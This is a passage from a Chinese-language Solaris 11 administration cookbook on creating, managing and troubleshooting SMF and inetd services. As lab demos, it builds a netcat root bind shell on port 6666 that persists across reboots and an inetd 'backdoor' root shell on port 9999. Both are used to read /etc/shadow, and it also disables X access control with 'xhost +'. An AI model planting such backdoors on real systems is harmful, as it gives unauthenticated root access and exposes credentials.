-r--r--r--   1 root     sys          534 Sep 19  2012 platform_none.xml
lrwxrwxrwx   1 root     root          17 Dec 23 18:41 platform.xml -> platform_none.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:56 site
```

尽管有多个清单，但其中有两个最为重要：`generic.xml`，它启用所有标准服务，以及`generic_limited_net.xml`，它禁用大多数互联网服务，除了`ssh`服务和一些其他远程服务。后者的清单如下：

```
root@solaris11-1:/etc/svc/profile# more generic_limited_net.xml
<?xml version='1.0'?>
(truncated output)
  <!--
      svc.startd(1M) services
  -->
  <service name='system/coreadm' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>
  <service name='system/cron' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>
  <service name='system/cryptosvc' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>

(truncated output)

<service name='network/ssh' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>

(truncated output)

```

可以通过不同的方法配置服务并自定义其行为；此外，了解 SMF 框架从哪里读取服务属性非常重要。因此，SMF 收集服务属性的目录和文件如下：

+   `manifest`：这从`/lib/svc/manifest`或`/var/svc/manifest`目录获取属性

+   `site-profile`：这从`/etc/svc/profile/site`目录或`/etc/svc/profile/`下的`site.xml`配置文件获取属性

### 配方概述

在这一部分，你了解了很多关于配置文件和清单的细节，例如它们的元素和可用类型。所有这些概念将在下一部分中部署。

# 创建 SMF 服务

这次，我们要在 Oracle Solaris 11 中创建一个新服务，所选应用程序是 gedit，这是一个图形化编辑器。显然，我们可以使用任何应用程序展示相同的过程，只需进行必要的更改以适应这个示例。

## 准备就绪

这个配方需要一个安装了 Oracle Solaris 11 并且有 4 GB 内存的虚拟机（VirtualBox 或 VMware）。

## 如何操作...

第一步是创建一个脚本，启动和停止我们感兴趣的应用程序。`/lib/svc/method`目录下有多个脚本，我们可以使用其中一个作为模板，但我使用了一个非常基础的模板，如下所示：

```
root@solaris11-1:~/chapter5# vi gedit_script.sh 
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in 
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &
;;
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK
```

这个脚本简单且有效，但我们需要更改其权限，并将其复制到`/lib/svc/`目录下的`method`目录，这是服务脚本的默认位置。可以通过以下方式完成此任务：

```
root@solaris11-1:~/chapter5# chmod u+x gedit_script.sh 
root@solaris11-1:~/chapter5# more gedit_script.sh

```

在下一步中，我们将创建一个清单，但由于从头开始创建非常复杂，我们可以从另一个现有服务获取一个清单并将其复制到主目录中。然后，我们需要做适当的修改以使其适应我们的目标，如下所示：

```
root@solaris11-1:~# cp /lib/svc/manifest/system/cron.xml /root/chapter5/gedit_script_Manifest.xml
root@solaris11-1:~# cd /root/chapter5
root@solaris11-1:~/chapter5# vi gedit_script_Manifest.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='gedit_script'>

<service
  name='application/gedit_script'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='milestone'
    type='service'
    grouping='require_all'
    restart_on='none'>
 <service_fmri value='svc:/milestone/multi-user' />
  </dependency>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/gedit_script.sh start'
 timeout_seconds='120'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='stop'
    exec='/lib/svc/method/gedit_script.sh stop'
 timeout_seconds='120'>
  </exec_method>

  <property_group name='startd' type='framework' >
 <propval name='duration' type='astring' value='transient' />
 </property_group>

  <instance name='default' enabled='false' />

  <stability value='Unstable' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
      graphical editor (gedit)
      </loctext>
    </common_name>
    <documentation>
 <manpage title='gedit' section='1' manpath='/usr/share/man' />
    </documentation>
  </template>
</service>

</service_bundle>
```

这是一个很长的 XML 文件，但很简单。有些地方需要解释：

+   服务名称是`gedit_script`，如下行所示：

    ```
    name='application/gedit_script'
    ```

+   服务依赖于`milestone`多用户，如下片段所示：

    ```
    <dependency
        name='milestone'
        type='service'
        grouping='require_all'
        restart_on='none'>
        <service_fmri value='svc:/milestone/multi-user' />
    </dependency>
    ```

+   启动和停止服务的时间限制是`120`秒，如下片段所示：

    ```
    <exec_method
        type='method'
        name='start'
        exec='/lib/svc/method/gedit_script.sh start'
     timeout_seconds='120'>
        <method_context>
          <method_credential user='root' group='root' />
        </method_context>
      </exec_method>
    <exec_method
        type='method'
        name='stop'
        exec='/lib/svc/method/gedit_script.sh stop'
     timeout_seconds='120'>
      </exec_method>
    ```

+   `<property_group>`部分将服务配置为旧的服务类型（`transient`），以防止如果`gedit_script`服务失败，SMF 会自动重启它，如下片段所示：

    ```
    <property_group name='startd' type='framework' >
      <propval name='duration' type='astring' value='transient' />
      </property_group>
    ```

+   服务的默认状态是禁用的，如以下行所示：

    ```
    <instance name='default' enabled='false' />
    ```

在尝试导入此清单之前，必须验证是否存在语法错误。因此，请执行以下命令：

```
root@solaris11-1:~/chapter5# svccfg validate gedit_script_Manifest.xml

```

到目前为止，一切听起来不错。因此，我们可以通过运行以下命令将清单导入到存储库中：

```
root@solaris11-1:~/chapter5# svccfg import gedit_script_Manifest.xml

```

### 注意

之前的命令是一个关键命令，因为每次修改清单时，都必须运行该命令以更新存储库中的新配置。

如果没有错误，服务应该会出现在其他服务中，如下所示：

```
root@solaris11-1:~/chapter5# svcs -a | grep gedit
disabled        3:50:02 svc:/application/gedit_script:default
```

太好了！现在是时候启动服务了，执行第二个命令后，gedit 编辑器（图形化编辑器）必须启动（记住，我们已经创建了一个名为`gedit_script.sh`的脚本来启动`gedit`编辑器）：

```
root@solaris11-1:~# xhost +
access control disabled, clients can connect from any host
root@solaris11-1:~# svcadm enable svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit
online         15:03:19 svc:/application/gedit_script:default
root@solaris11-1:~#
```

执行以下命令可以显示此新服务的属性：

```
root@solaris11-1:~# svcprop svc:/application/gedit_script:default
general/complete astring 
general/enabled boolean false
general/entity_stability astring Unstable
general/single_instance boolean true
milestone/entities fmri svc:/milestone/multi-user
milestone/grouping astring require_all
milestone/restart_on astring none
milestone/type astring service
manifestfiles/root_chapter5_gedit_script_Manifest_xml astring /root/chapter5/gedit_script_Manifest.xml
startd/duration astring transient
start/exec astring /lib/svc/method/gedit_script.sh\ start
start/group astring root
start/timeout_seconds count 120
start/type astring method
start/use_profile boolean false
start/user astring root
stop/exec astring /lib/svc/method/gedit_script.sh\ stop
stop/timeout_seconds count 120
stop/type astring method
tm_common_name/C ustring graphical\ editor\ \(gedit\)
tm_man_gedit1/manpath astring /usr/share/man
tm_man_gedit1/section astring 1
tm_man_gedit1/title astring gedit
restarter/logfile astring /var/svc/log/application-gedit_script:default.log
restarter/start_pid count 8097
restarter/start_method_timestamp time 1394042599.387615000
restarter/start_method_waitstatus integer 0
restarter/transient_contract count 
restarter/auxiliary_state astring dependencies_satisfied
restarter/next_state astring none
restarter/state astring online
restarter/state_timestamp time 1394042599.397622000
restarter_actions/refresh integer 
restarter_actions/auxiliary_tty boolean true
restarter_actions/auxiliary_fmri astring svc:/application/graphical-login/gdm:default
```

要列出与`gedit_script`服务相关的环境变量，请执行以下命令：

```
root@solaris11-1:~# pargs -e `pgrep -f gedit_script`
7919:  tail -f /var/svc/log/application-gedit_script:default.log
envp[0]: ORBIT_SOCKETDIR=/var/tmp/orbit-root
envp[1]: SSH_AGENT_PID=6312
envp[2]: TERM=xterm
envp[3]: SHELL=/usr/bin/bash
envp[4]: XDG_SESSION_COOKIE=f8114f3c252db0743fd58c3e0000009e-1394035066.410005-1956267226
envp[5]: GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2
envp[6]: WINDOWID=31457283
(truncated output)

```

最后，要停止`gedit_script`服务并验证一切是否按预期发生，请执行以下命令：

```
root@solaris11-1:~# svcadm disable gedit_script
root@solaris11-1:~# svcs -a | grep gedit
disabled       15:26:35 svc:/application/gedit_script:default
```

太棒了！一切正常！现在让我们来谈谈配置文件。

**配置文件**也非常重要，它们决定了在启动过程中哪些服务将被启动。因此，适当调整它们以仅启动必要的服务是合理的，这有助于减少黑客攻击面。

以下步骤将创建一个新服务（比`gedit_script`服务更有趣），使用强大的`netcat`工具（`nc`）。这些步骤与之前使用的步骤相同。为了回顾，请参考以下步骤：

1.  创建一个脚本。

1.  使其可执行。

1.  将其复制到`/lib/svc/method`。

1.  为该服务创建一个清单。

1.  验证清单。

1.  导入清单。

1.  列出服务。

1.  启动服务。

1.  测试服务。

1.  停止服务。

以下是创建新服务的命令顺序。根据我们之前的步骤，第一步是创建一个启动和停止服务的脚本，如下所示：

```
root@solaris11-1:~/chapter5# vi netcat.sh
#!/sbin/sh
. /lib/svc/share/smf_include.sh

case "$1" in 
'start')
/usr/bin/nc -D -d -l -p 6666 -e /sbin/sh &
;;
'stop')
pkill -x -u 0 netcat
;;
*)
echo $"Usage: $0 {start/stop}"
exit 1
;;
esac
exit $SMF_EXIT_OK
```

授予脚本执行权限，并将其复制到包含其他现有服务脚本的适当目录，如下所示：

```
root@solaris11-1:~/chapter5# chmod u+x netcat.sh
root@solaris11-1:~/chapter5# cp netcat.sh /lib/svc/method/

```

下一步是为该服务（`netcat`）创建一个清单。从现有服务复制清单并进行调整会更容易，如下所示：

```
root@solaris11-1:~/chapter5# vi netcat_manifest.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='netcat'>

<service
  name='application/netcat'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='milestone'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/multi-user' />
  </dependency>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/netcat.sh start'
    timeout_seconds='120'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='stop'
    exec='/lib/svc/method/netcat.sh stop'
    timeout_seconds='120'>
  </exec_method>

  <property_group name='startd' type='framework' >
  <propval name='duration' type='astring'  value='transient' />
  </property_group>

  <instance name='default' enabled='false' />

  <stability value='Unstable' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
      hacker tool (nc)
      </loctext>
    </common_name>
    <documentation>
      <manpage title='nc' section='1' manpath='/usr/share/man' />
    </documentation>
  </template>
</service>

</service_bundle>
```

在继续之前，我们需要验证`netcat_manifest.xml`清单，完成此步骤后，可以将清单导入到服务库中，命令如下所示：

```
root@solaris11-1:~/chapter5# svccfg validate netcat_manifest.xml
root@solaris11-1:~/chapter5# svccfg import netcat_manifest.xml

```

为了验证服务是否已正确导入，请通过运行以下命令检查它是否出现在 SMF 服务列表中：

```
root@solaris11-1:~/chapter5# svcs -a | grep netcat
disabled       18:56:09 svc:/application/netcat:default
root@solaris11-1:~/chapter5# svcadm enable svc:/application/netcat:default
root@solaris11-1:~/chapter5# svcs -a | grep netcat
online         19:14:17 svc:/application/netcat:default
```

若要收集关于`netcat`服务的其他详细信息，请执行以下命令：

```
root@solaris11-1:~/chapter5# svcs -l svc:/application/netcat:default
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 07:14:17 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
contract_id  
manifest     /root/chapter5/netcat_manifest.xml
dependency   require_all/none svc:/milestone/multi-user (online)

root@solaris11-1:~/chapter5# svcs -xv svc:/application/netcat:default
svc:/application/netcat:default (hacker tool (nc))
 State: online since March  5, 2014 07:14:17 PM BRT
   See: man -M /usr/share/man -s 1 nc
   See: /var/svc/log/application-netcat:default.log
Impact: None.
```

可以通过运行以下命令检查特定的`netcat 服务`日志，查看是否存在任何问题：

```
root@solaris11-1:~/chapter5# tail -f /var/svc/log/application-netcat:default.log
(truncated output)
[ Mar  5 19:14:16 Enabled. ]
[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0\. ]
```

为了测试我们的新服务是否真的有效，请运行以下命令：

```
root@solaris11-1:~/chapter5# nc localhost 6666
pwd
/root
cd /
pwd
/
cat /etc/shadow
root:$5$oXrpLA3o$UTJJeO.MfjlTBGzJI.yzhHvqhvW.xUWBknpCKHRvP79:16131::::::22560
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
(truncated output)

```

这太棒了！

我们需要通过执行以下命令检查`netcat`服务是否能够适当地停止：

```
root@solaris11-1:~/chapter5# svcadm disable netcat
root@solaris11-1:~/chapter5# svcs -a | grep netcat
disabled       19:27:14 svc:/application/netcat:default
```

服务的日志文件有助于检查服务状态，如下所示：

```
root@solaris11-1:~/chapter5# tail -f /var/svc/log/application-netcat:default.log
 [ Mar  5 19:14:16 Enabled. ]
[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0\. ]
^X[ Mar  5 19:27:14 Stopping because service disabled. ]
[ Mar  5 19:27:14 Executing stop method ("/lib/svc/method/netcat.sh stop"). ]
[ Mar  5 19:27:14 Method "stop" exited with status 0\. ]
```

到目前为止一切正常！下一步是提取当前活动的 SMF 配置文件并对其进行修改，以便现在和系统启动时都能启用`netcat`服务（`<create_default_instance enabled='true'/>`）。为此，请执行以下命令：

```
root@solaris11-1:~/chapter5# svccfg extract > myprofile.xml
root@solaris11-1:~/chapter5# vi myprofile.xml
<?xml version='1.0'?>
<!DOCTYPE service_bundle SYSTEM '/usr/share/lib/xml/dtd/service_bundle.dtd.1'>
<service_bundle type='profile' name='profile'>

(truncated output)

<service name='application/netcat' type='service' version='0'>
    <create_default_instance enabled='true'/>
    <single_instance/>
    <dependency name='milestone' grouping='require_all' restart_on='none' type='service'>
      <service_fmri value='svc:/milestone/multi-user'/>
    </dependency>
    <exec_method name='start' type='method' exec='/lib/svc/method/netcat.sh start' timeout_seconds='120'>
      <method_context>
        <method_credential user='root' group='root'/>
      </method_context>
    </exec_method>
    <exec_method name='stop' type='method' exec='/lib/svc/method/netcat.sh stop' timeout_seconds='120'/>
    <property_group name='startd' type='framework'>
      <propval name='duration' type='astring' value='transient'/>
    </property_group>
    <stability value='Unstable'/>
    <template>
      <common_name>
        <loctext xml:lang='C'>hacker tool (nc)</loctext>
      </common_name>
      <documentation>
        <manpage title='nc' section='1' manpath='/usr/share/man'/>
      </documentation>
    </template>
```

必须再次重复导入和验证的过程（这次是针对配置文件），可以通过执行以下命令来完成：

```
root@solaris11-1:~/chapter5# svccfg validate myprofile.xml
root@solaris11-1:~/chapter5# svccfg import my profile.xml

```

通过执行以下命令再次检查`netcat`服务的状态：

```
root@solaris11-1:~/chapter5# svcs -a | grep netcat
online         19:52:18 svc:/application/netcat:default
```

这简直难以置信！`netcat` 服务在配置文件中被配置为`enabled`，并且已被置于`online`状态。如果我们重启系统，将看到如下输出：

```
root@solaris11-1:~# svcs -a | grep netcat
online         20:02:50 svc:/application/netcat:default
root@solaris11-1:~# svcs -l netcat
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 08:02:50 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
manifest     /root/chapter5/netcat_manifest.xml
manifest     /root/chapter5/myprofile.xml
dependency   require_all/none svc:/milestone/multi-user (online)
```

输出中会显示两个 XML 文件（清单和配置文件）。

### 配方概览

通过执行所有常规步骤，如创建启动/停止脚本、创建清单、导入并运行服务，创建了一个新服务。此外，你还学会了如何自动修改配置文件，以便在 Oracle Solaris 11 的启动阶段启动服务。

# 管理 inetd 控制的网络服务

在 Oracle Solaris 11 中，有些服务不属于 SMF 管理范畴，它们由另一个（且较旧的）守护进程：inetd 控制。Inetd 是这些网络服务的官方重启器，在我们管理这些服务的过程中，完成所有任务的主要命令是`inetadm`。现在是时候看看它是如何工作的了。

## 准备工作

该过程需要一台运行 Oracle Solaris 11 并且内存为 4GB 的虚拟机（可以使用 VirtualBox 或 VMware）。

## 如何操作…

最初，有一些有趣的服务可以进行操作。因此，我们必须安装一个好的服务：`telnet`。执行以下命令：

```
root@solaris11-1:~# pkg install pkg://solaris/service/network/telnet

```

要列出现有的 inetd 服务，请执行以下命令：

```
root@solaris11-1:~# inetadm
ENABLED   STATE          FMRI
disabled  disabled       svc:/application/cups/in-lpd:default
disabled  disabled       svc:/application/x11/xfs:default
disabled  disabled       svc:/application/x11/xvnc-inetd:default
disabled  disabled       svc:/network/comsat:default
disabled  disabled       svc:/network/stdiscover:default
disabled  disabled       svc:/network/rpc/spray:default
enabled   online         svc:/network/rpc/smserver:default
enabled   online         svc:/network/rpc/gss:default
disabled  disabled       svc:/network/rpc/rex:default
disabled  disabled       svc:/network/nfs/rquota:default
enabled   online         svc:/network/security/ktkt_warn:default
disabled  disabled       svc:/network/stlisten:default
disabled  disabled       svc:/network/telnet:default
```

旧的`inetd.conf`仍然存在，但它已经没有任何与网络服务配置相关的内容了（所有行都被注释掉）：

```
root@solaris11-1:~# more /etc/inet/inetd.conf
#
# Copyright 2004 Sun Microsystems, Inc.  All rights reserved.
# Use is subject to license terms.
#
#ident  "%Z%%M%  %I%  %E% SMI"
#
# Legacy configuration file for inetd(1M).  See inetd.conf(4).
#
# This file is no longer directly used to configure inetd.
# The Solaris services which were formerly configured using this file
# are now configured in the Service Management Facility (see smf(5))
# using inetadm(1M).
#
# Any records remaining in this file after installation or upgrade,
# or later created by installing additional software, must be converted
# to smf(5) services and imported into the smf repository using
# inetconv(1M), otherwise the service will not be available.  Once
# a service has been converted using inetconv, further changes made to
# its entry here are not reflected in the service.
#
```

要收集关于刚刚安装的`telnet`服务的更多详细信息，必须执行以下命令：

```
root@solaris11-1:~# inetadm -l svc:/network/telnet:default
SCOPE    NAME=VALUE
         name="telnet"
         endpoint_type="stream"
         proto="tcp6"
         isrpc=FALSE
         wait=FALSE
         exec="/usr/sbin/in.telnetd"
         user="root"
default  bind_addr=""
default  bind_fail_max=-1
default  bind_fail_interval=-1
default  max_con_rate=-1
default  max_copies=-1
default  con_rate_offline=-1
default  failrate_cnt=40
default  failrate_interval=60
default  inherit_env=TRUE
default  tcp_trace=FALSE
default  tcp_wrappers=FALSE
default  connection_backlog=10
default  tcp_keepalive=FALSE
```

要启用`telnet`服务，执行以下命令：

```
root@solaris11-1:~# inetadm -e svc:/network/telnet:default
root@solaris11-1:~# inetadm | grep telnet
enabled   online         svc:/network/telnet:default
```

由于`telnet`服务有多个属性，可以在故障排除会话中进行更改。例如，为了使`telnet`服务将所有记录日志到`syslog`服务中，可以执行以下命令：

```
root@solaris11-1:~# inetadm -m  svc:/network/telnet:default tcp_trace=true
root@solaris11-1:~# inetadm -l telnet | grep tcp_trace
         tcp_trace=TRUE
```

太好了！当`telnet`服务不再需要时，我们可以禁用它：

```
root@solaris11-1:~# inetadm -d svc:/network/telnet:default
root@solaris11-1:~# inetadm | grep telnet
disabled  disabled       svc:/network/telnet:default
```

很好！是时候在下一个示例中学习另一个非常有趣且不寻常的技巧了。

现在，我们的目标是通过在`/etc/inet/`下的旧`inetd.conf`文件中创建一个非常简单的后门服务，并将其转换为 SMF。我们该如何做呢？很简单！第一步是通过执行以下命令，在`/etc/inet/`下的`inetd.conf`文件中创建一个服务行：

```
root@solaris11-1:~# vi /etc/inet/inetd.conf

(truncated output)
backdoor  stream  tcp6  nowait  root  /sbin/sh  /sbin/sh -a
```

由于我们已经在`inetd.conf`文件中创建了上述行，我们必须在`/etc/services`文件中为该服务分配一个 TCP 端口（最后一行），可以执行以下命令：

```
root@solaris11-1:~# vi /etc/services
(truncated output)
backdoor  9999/tcp      # backdoor
```

有一个名为`inetconf`的命令，它可以轻松地将 INET 服务转换为 SMF 服务：

```
root@solaris11-1:~# inetconv
backdoor -> /lib/svc/manifest/network/backdoor-tcp6.xml
Importing backdoor-tcp6.xml ...svccfg: Restarting svc:/system/manifest-import
```

为了验证服务是否按照预期转换为 SMF 模型，请执行以下命令：

```
root@solaris11-1:~# svcs -a | grep backdoor
online         20:36:15 svc:/network/backdoor/tcp6:default
```

最后，为了测试后门服务是否正常工作，执行以下命令：

```
root@solaris11-1:~# nc localhost 9999
ls
chapter5
core
Desktop
Documents
Downloads
Public
cd /
pwd
/
grep root /etc/shadow
root:$5$oXepLA3w$UTJJeO.MfVl1BGzJI.yzhHvqhvq.xUWBknCCKHRvP79:16131::::::22560
```

太棒了！后门服务运行得很好！

更进一步，Oracle Solaris 11 提供了一个名为`netservice`的命令，它可以通过应用`generic_limited_net.xml`配置文件并配置某些服务的本地模式属性，打开或关闭大多数网络服务（除了`ssh`服务），以进行远程访问。我建议你花点时间检查一下这个配置文件。

使用 `netservices` 命令关闭大多数网络服务以防远程访问很简单，可以通过运行以下命令来完成：

```
root@solaris11-1:~# netservices limited
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail
```

要反转每个网络服务的状态（启用或禁用），请运行以下命令：

```
root@solaris11-1:~# netservices open
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail
```

### 配方概述

您学会了如何管理 inetd 服务以及如何将 inetd 服务转换为 SMF 服务。本节的主要命令是 `inetadm` 和 `inetconv`。

# 故障排除 Oracle Solaris 11 服务

在本章的最后一部分，您将学习如何排除正在出现错误的服务，并修复损坏的仓库。

## 准备工作

要遵循这个步骤，您需要一台虚拟机（使用 VirtualBox 或 VMware），并安装 Oracle Solaris 11，且需要 4 GB 的 RAM。

## 如何操作……

管理员的主要职责是确保一切正常运行。分析系统的最佳方法是运行以下命令：

```
root@solaris11-1:~# svcs –xv

```

目前系统没有问题，但我们可以模拟一个。例如，在下一步中，我们将通过从脚本中删除一个分号来破坏 `gedit_script` 服务，如下所示：

```
root@solaris11-1:~# vi /lib/svc/method/gedit_script.sh
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &
;-----------------à Remove this semicolon!
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK
```

为了继续操作，`gedit_script` 服务将被禁用并再次启用，通过执行以下命令：

```
root@solaris11-1:~# svcadm disable svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit_script
disabled        0:22:13 svc:/application/gedit_script:default
root@solaris11-1:~# svcadm enable svc:/application/gedit_script:default
You have new mail in /var/mail/root
root@solaris11-1:~# svcs -a | grep gedit_script
maintenance     0:29:13 svc:/application/gedit_script:default
```

根据前面的三次输出，我们迅速破坏并重新启动了服务，因此它进入了维护状态。为了收集更多关于服务的信息，以便集中分析可能的原因，执行以下命令：

```
root@solaris11-1:~# svcs -xv svc:/application/gedit_script:default
svc:/application/gedit_script:default (graphical editor (gedit))
 State: maintenance since March  6, 2014 12:29:13 AM BRT
Reason: Start method failed repeatedly, last exited with status 3.
   See: http://support.oracle.com/msg/SMF-8000-KS
   See: man -M /usr/share/man -s 1 gedit
   See: /var/svc/log/application-gedit_script:default.log
Impact: This service is not running.
```

服务未运行，并且从其日志文件中可以获取更多详细信息，如下所示：

```
root@solaris11-1:~# tail -f /var/svc/log/application-gedit_script:default.log
[ Mar  6 00:29:13 Enabled. ]
[ Mar  6 00:29:13 Executing start method ("/lib/svc/method/gedit_script.sh start"). ]
/lib/svc/method/gedit_script.sh: line 2: syntax error at line 9: `)' unexpected
[ Mar  6 00:29:13 Method "start" exited with status 3\. ]
```

太棒了！Oracle Solaris 11 SMF 框架描述了错误发生的确切行号。为了修复问题，我们必须修复损坏的行（通过在我们移除分号的地方再次添加 `;`）并将服务恢复到 `online` 状态。然后，修复语法问题后，运行以下命令：

```
root@solaris11-1:~# svcadm clear svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit_script
online          0:39:12 svc:/application/gedit_script:default
```

完美！服务已经恢复到在线状态！

进入最后一个话题，SMF 仓库是通过 `svc.configd` 守护进程访问的，正是该守护进程控制对服务仓库的所有读写操作。此外，`svc.configd` 在启动时还会检查仓库的完整性。仓库损坏是很少见的，但确实可能发生，在这种情况下，我们可以在系统处于在线模式或维护模式（通过 `sulogin` 命令）时修复它。要修复仓库，请运行以下命令：

```
root@solaris11-1:~# /lib/svc/bin/restore_repository

```

查看 [`support.oracle.com/msg/SMF-8000-MY`](http://support.oracle.com/msg/SMF-8000-MY) 以获取更多关于使用此脚本恢复 `smf(5)` 仓库备份副本的信息。

如果存在需要人工干预的问题，脚本将提供指示并退出到您的 shell：

```
/lib/svc/bin/restore_repository[71]: [: /: arithmetic syntax error
The following backups of /etc/svc/repository.db exist, from
Oldest to newest:

manifest_import-20140117_072325
boot-20140305_132432
manifest_import-20140305_170246
manifest_import-20140305_170535
boot-20140305_180217
boot-20140305_200130
manifest_import-20140305_203615
boot-20140306_005602
```

备份是根据其类型以及备份创建的时间来命名的。以 `boot` 开头的备份是在系统启动后第一次对仓库进行更改之前创建的。以 `manifest_import` 开头的备份是在 `svc:/system/manifest-import:default` 处理完成后创建的。

备份的时间格式为 `YYYYMMDD_HHMMSS`。

请从上面的备份仓库列表中输入特定的仓库进行恢复，或选择以下选项之一：

```
  CHOICE      ACTION
  ----------------  ----------------------------------------------
  boot      restore the most recent post-boot backup
  manifest_import    restore the most recent manifest_import backup
  -seed-      restore the initial starting repository  (All
          customizations will be lost, including those
          made by the install/upgrade process.)
  -quit-      cancel script and quit

Enter response [boot]:
```

在选择选项之前，你必须了解系统中存在的仓库备份类型：

+   `boot-<timestamp>`：在 `boot-<timestamp>` 中，备份是在系统启动后但在进行任何更改之前创建的。

+   `manifest_import-<timestamp>`：在 `manifest_import-<timestamp>` 中，备份是在 `svc:/system/manifest-import:default` 执行后创建的。

+   `--seed--`：此选项恢复初始仓库。如果我们恢复这个备份，所有已做的服务或更改将丢失！

在这种情况下，我们将选择 `boot` 选项，如下所示：

```
Enter response [boot]: boot
After confirmation, the following steps will be taken:

svc.startd(1M) and svc.configd(1M) will be quiesced, if running.
/etc/svc/repository.db
    -- renamed --> /etc/svc/repository.db_old_20140306_011224
/etc/svc/repository-boot
    -- copied --> /etc/svc/repository.db 
and the system will be rebooted with reboot(1M).

Proceed [yes/no]? yes

```

系统重启后，系统重新上线，一切正常！

### 备份概览

在本章中，你学习了如何使用 `svcs –xv <fmri>` 查找服务错误并修复它，如何让服务重新上线（`svcadm clear <fmri>`），以及在极端情况下，如何使用 `/lib/svc/bin/restore_repository` 命令恢复仓库。

# 参考资料

+   *Oracle Solaris 管理：常见任务* 见 [`docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf`](http://docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf)

+   *Oracle Solaris 11* *管理员备忘单* 见 [`www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf`](http://www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf)
